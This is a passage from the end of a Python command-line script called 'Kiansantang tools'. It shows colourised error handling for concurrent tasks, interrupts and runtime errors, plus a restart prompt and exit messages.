            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(
                        Fore.WHITE
                        + f"[ {Fore.LIGHTRED_EX}TASK ERROR{Fore.WHITE} ] "
                        + str(e)
                        + Style.RESET_ALL
                    )
                    exit(2)

    except KeyboardInterrupt:
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}INTERRUPTED{Fore.WHITE} ] "
            + "Process interrupted by user.\n"
            + Style.RESET_ALL
        )
        exit(2)

    except RuntimeError:
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}RUNTIME ERROR{Fore.WHITE} ] "
            + "A runtime error occurred.\n"
            + Style.RESET_ALL
        )
        exit(2)

    except Exception as e:
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}UNEXPECTED ERROR{Fore.WHITE} ] "
            + str(e)
            + Style.RESET_ALL
        )
        exit(2)

    if prompt_restart():
        main()
    else:
        print(
            Fore.LIGHTGREEN_EX
            + "\nExiting Kiansantang tools. Goodbye."
            + Style.RESET_ALL
        )
        sys.exit(2)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(1)